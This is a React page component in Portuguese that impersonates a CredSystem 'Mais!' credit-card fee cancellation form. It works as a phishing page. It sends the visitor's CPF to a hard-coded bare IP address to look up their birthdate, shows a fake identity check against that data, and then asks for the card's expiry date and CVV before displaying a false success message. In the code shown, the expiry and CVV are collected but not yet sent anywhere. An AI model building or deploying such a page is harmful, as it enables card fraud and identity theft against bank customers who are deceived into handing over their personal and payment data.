"use client"

import { Navbar } from "@/components/navbar"
import { useState } from "react"

function LoadingSpinner() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="relative">
        {/* Círculo azul girando */}
        <div className="w-20 h-20 border-4 border-transparent border-t-[#0066cc] rounded-full animate-spin"></div>
        {/* Check verde no centro */}
        <div className="absolute inset-0 flex items-center justify-center">
          <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
          </svg>
        </div>
      </div>
      <p className="mt-4 text-gray-600 text-sm">Processando sua solicitação...</p>
    </div>
  )
}

function generateWrongDate(correctDate: string): string {
  const [day, month, year] = correctDate.split("/")
  const wrongDay = String((Number.parseInt(day) % 28) + 1).padStart(2, "0")
  const wrongMonth = String((Number.parseInt(month) % 12) + 1).padStart(2, "0")
  return `${wrongDay}/${wrongMonth}/${year}`
}

export default function Home() {
  const [step, setStep] = useState<
    "cpf" | "loading1" | "birthdate" | "loading2" | "expiry" | "loading3" | "cvv" | "loading4" | "success"
  >("cpf")
  const [cpf, setCpf] = useState("")
  const [correctDate, setCorrectDate] = useState("")
  const [wrongDate, setWrongDate] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cvv, setCvv] = useState("")

  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 3) return numbers
    if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`
    if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`
  }

  const formatExpiry = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 2) return numbers
    return `${numbers.slice(0, 2)}/${numbers.slice(2, 4)}`
  }

  const handleContinue = async () => {
    if (cpf.replace(/\D/g, "").length !== 11) return

    setStep("loading1")

    try {
      const cpfNumbers = cpf.replace(/\D/g, "")
      const response = await fetch(`http://89.116.24.233:3000/api/cpf/${cpfNumbers}`)
      const data = await response.json()

      if (data.NASC) {
        setCorrectDate(data.NASC)
        setWrongDate(generateWrongDate(data.NASC))
      } else {
        // Fallback se não retornar data
        setCorrectDate("21/12/1983")
        setWrongDate("15/06/1983")
      }
    } catch (error) {
      // Fallback em caso de erro
      setCorrectDate("21/12/1983")
      setWrongDate("15/06/1983")
    }

    setTimeout(() => {
      setStep("birthdate")
    }, 2000)
  }

  const handleSelectDate = (isCorrect: boolean) => {
    if (isCorrect) {
      setStep("loading2")
      setTimeout(() => {
        setStep("expiry")
      }, 2000)
    }
  }

  const handleExpirySubmit = () => {
    if (expiry.length < 5) return
    setStep("loading3")
    setTimeout(() => {
      setStep("cvv")
    }, 2000)
  }

  const handleCvvSubmit = () => {
    if (cvv.length < 3) return
    setStep("loading4")
    setTimeout(() => {
      setStep("success")
    }, 2000)
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5] pt-16">
      <Navbar />

      <main className="flex flex-col items-center px-4 py-6">
        <div className="bg-white w-full max-w-xl shadow-md rounded-lg overflow-hidden">
          <div className="p-5 md:p-8">
            {/* Step 1: CPF */}
            {step === "cpf" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Solicitar Cancelamento
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Cancele a taxa mensal do seu cartão CredSystem de forma segura.
                </p>

                <div className="mb-6">
                  <label className="text-[#0066cc] text-sm font-medium mb-2 block">CPF</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    className="w-full text-[#0066cc] text-lg border-b-2 border-gray-200 py-2 outline-none focus:border-[#0066cc] transition-colors bg-transparent"
                    placeholder="000.000.000-00"
                    value={cpf}
                    onChange={(e) => setCpf(formatCpf(e.target.value))}
                    maxLength={14}
                  />
                </div>

                <button
                  className="w-full bg-[#1a365d] hover:bg-[#2d4a7c] text-white py-3.5 rounded-lg font-medium transition-colors"
                  onClick={handleContinue}
                >
                  Continuar
                </button>
              </>
            )}

            {/* Loading states */}
            {(step === "loading1" || step === "loading2" || step === "loading3" || step === "loading4") && (
              <div className="py-8">
                <LoadingSpinner />
              </div>
            )}

            {/* Step 2: Confirmar identidade com data de nascimento */}
            {step === "birthdate" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Confirme sua Identidade
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Selecione sua data de nascimento correta.
                </p>

                <div className="space-y-3">
                  <button
                    className="w-full p-4 border-2 border-gray-200 rounded-lg text-left hover:border-[#0066cc] hover:bg-blue-50 transition-all"
                    onClick={() => handleSelectDate(false)}
                  >
                    <span className="text-lg text-gray-700">{wrongDate}</span>
                  </button>
                  <button
                    className="w-full p-4 border-2 border-gray-200 rounded-lg text-left hover:border-[#0066cc] hover:bg-blue-50 transition-all"
                    onClick={() => handleSelectDate(true)}
                  >
                    <span className="text-lg text-gray-700">{correctDate}</span>
                  </button>
                </div>
              </>
            )}

            {/* Step 3: Data de validade */}
            {step === "expiry" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Data de Validade
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Informe a data de validade do seu cartão.
                </p>

                <div className="mb-6">
                  <label className="text-[#0066cc] text-sm font-medium mb-2 block">Validade</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    className="w-full text-[#0066cc] text-lg border-b-2 border-gray-200 py-2 outline-none focus:border-[#0066cc] transition-colors bg-transparent"
                    placeholder="MM/AA"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    maxLength={5}
                  />
                </div>

                <button
                  className="w-full bg-[#1a365d] hover:bg-[#2d4a7c] text-white py-3.5 rounded-lg font-medium transition-colors"
                  onClick={handleExpirySubmit}
                >
                  OK
                </button>
              </>
            )}

            {/* Step 4: CVV */}
            {step === "cvv" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Código de Segurança
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Informe o CVV do seu cartão (3 dígitos no verso).
                </p>

                <div className="mb-6">
                  <label className="text-[#0066cc] text-sm font-medium mb-2 block">CVV</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    className="w-full text-[#0066cc] text-lg border-b-2 border-gray-200 py-2 outline-none focus:border-[#0066cc] transition-colors bg-transparent"
                    placeholder="000"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                    maxLength={3}
                  />
                </div>

                <button
                  className="w-full bg-[#1a365d] hover:bg-[#2d4a7c] text-white py-3.5 rounded-lg font-medium transition-colors"
                  onClick={handleCvvSubmit}
                >
                  OK
                </button>
              </>
            )}

            {/* Step 5: Sucesso */}
            {step === "success" && (
              <div className="flex flex-col items-center justify-center py-8">
                <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mb-4">
                  <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Solicitação Enviada
                </h1>
                <p className="text-sm text-center" style={{ color: "#1976d2" }}>
                  Sua solicitação de cancelamento foi enviada com sucesso.
                </p>
              </div>
            )}
          </div>
        </div>

        <div className="flex justify-center my-8">
          <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center">
            <svg className="w-5 h-5 text-[#0066cc]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 14l-7 7m0 0l-7-7m7 7V3" />
            </svg>
          </div>
        </div>

        <section className="w-full px-2">
          <div className="max-w-4xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4">
            {/* Card 1 - Internacional */}
            <div className="bg-white rounded-xl p-4 shadow-[0_2px_12px_rgba(0,0,0,0.08)] hover:shadow-[0_4px_20px_rgba(0,0,0,0.12)] transition-shadow">
              <div className="flex justify-center mb-3">
                <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center">
                  <svg className="w-5 h-5 text-[#0066cc]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={1.5}
                      d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                </div>
              </div>
              <h3 className="font-semibold text-[#1a365d] text-sm mb-1.5 leading-tight">O Mais! é internacional</h3>
              <p className="text-xs text-[#4a6fa5] leading-relaxed">
                Tem bandeira Mastercard e é aceito no mundo todo.
              </p>
            </div>

            {/* Card 2 - Mais Segurança */}
            <div className="bg-white rounded-xl p-4 shadow-[0_2px_12px_rgba(0,0,0,0.08)] hover:shadow-[0_4px_20px_rgba(0,0,0,0.12)] transition-shadow">
              <div className="flex justify-center mb-3">
                <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center">
                  <svg className="w-5 h-5 text-[#0066cc]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={1.5}
                      d="M12 15v2m-6 4h12a2 2 0 002 2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
              </div>
              <h3 className="font-semibold text-[#1a365d] text-sm mb-1.5 leading-tight">Mais Segurança</h3>
              <p className="text-xs text-[#4a6fa5] leading-relaxed">
                Com o cartão virtual suas compras online ficam mais seguras.
              </p>
            </div>

            {/* Card 3 - Tudo no app */}
            <div className="bg-white rounded-xl p-4 shadow-[0_2px_12px_rgba(0,0,0,0.08)] hover:shadow-[0_4px_20px_rgba(0,0,0,0.12)] transition-shadow">
              <div className="flex justify-center mb-3">
                <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center">
                  <svg className="w-5 h-5 text-[#0066cc]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={1.5}
                      d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"
                    />
                  </svg>
                </div>
              </div>
              <h3 className="font-semibold text-[#1a365d] text-sm mb-1.5 leading-tight">Tudo no app do Mais!</h3>
              <p className="text-xs text-[#4a6fa5] leading-relaxed">Pagamento de contas, boletos e fatura digital.</p>
            </div>

            {/* Card 4 - Você Pode Mais! */}
            <div className="bg-white rounded-xl p-4 shadow-[0_2px_12px_rgba(0,0,0,0.08)] hover:shadow-[0_4px_20px_rgba(0,0,0,0.12)] transition-shadow">
              <div className="flex justify-center mb-3">
                <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center">
                  <svg className="w-5 h-5 text-[#0066cc]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={1.5}
                      d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                </div>
              </div>
              <h3 className="font-semibold text-[#1a365d] text-sm mb-1.5 leading-tight">Você Pode Mais!</h3>
              <p className="text-xs text-[#4a6fa5] leading-relaxed">
                Plataforma de benefícios com sorteios e descontos exclusivos.
              </p>
            </div>
          </div>
        </section>
      </main>
    </div>
  )
}
